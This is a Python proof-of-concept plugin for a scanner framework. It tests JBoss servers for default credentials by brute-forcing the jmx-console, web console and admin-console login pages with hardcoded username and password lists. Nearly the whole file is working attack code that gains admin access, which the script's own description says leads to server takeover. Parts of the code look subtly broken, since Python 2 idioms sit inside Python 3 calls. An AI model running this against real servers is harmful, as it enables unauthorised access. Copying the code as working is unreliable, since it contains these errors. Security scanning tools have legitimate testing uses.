# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'crack_JBoss'  # 平台漏洞编号
    name = 'JBoss弱口令'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JBoss'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4a1014df-55dd-4019-addc-743a741f17e2'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)
            error_i = 0
            timeout = 10
            flag_list = ['>jboss.j2ee</a>', 'JBoss JMX Management Console',
                         'HtmlAdaptor?action=displayMBeans', '<title>JBoss Management']
            user_list = ['admin', 'manager', 'jboss', 'root']
            password_list = ['admin', '123456', 'root', 'jboss']
            for user in user_list:
                for password in password_list:
                    try:
                        login_url = url+'/jmx-console'
                        request = urllib.request.Request(login_url)
                        auth_str_temp = user+':'+password
                        auth_str = base64.b64encode(auth_str_temp)
                        request.add_header('Authorization', 'Basic '+auth_str)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_code = res.code
                        res_html = res.read()
                    except urllib.error.HTTPError as e:
                        res_code = e.code
                        res_html = e.read()
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    if int(res_code) == 404:
                        break
                    if int(res_code) == 401:
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
            for user in user_list:
                for password in password_list:
                    try:
                        login_url = url+'/console/App.html'
                        request = urllib.request.Request(login_url)
                        auth_str_temp = user+':'+password
                        auth_str = base64.b64encode(auth_str_temp)
                        request.add_header('Authorization', 'Basic '+auth_str)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_code = res.code
                        res_html = res.read()
                    except urllib.error.HTTPError as e:
                        res_code = e.code
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    if int(res_code) == 404:
                        break
                    if int(res_code) == 401:
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))

            for user in user_list:
                for password in password_list:
                    try:
                        login_url = url+'/admin-console/login.seam'
                        res_html = urllib.request.urlopen(login_url).read()
                        if '"http://jboss.org/embjopr/"' in res_html:
                            key_str = re.search(
                                'javax.faces.ViewState\" value=\"(.*?)\"', res_html)
                            key_hash = urllib.parse.quote(key_str.group(1))
                            PostStr = "login_form=login_form&login_form:name=%s&login_form:password=%s&login_form:submit=Login&javax.faces.ViewState=%s" % (
                                user, password, key_hash)
                            request = urllib.request.Request(
                                login_url, PostStr)
                            res = urllib.request.urlopen(
                                request, timeout=timeout)
                            if 'admin-console/secure/summary.seam' in res.read():
                                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                    target=self.target, name=self.vuln.name))
                    except:
                        pass
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
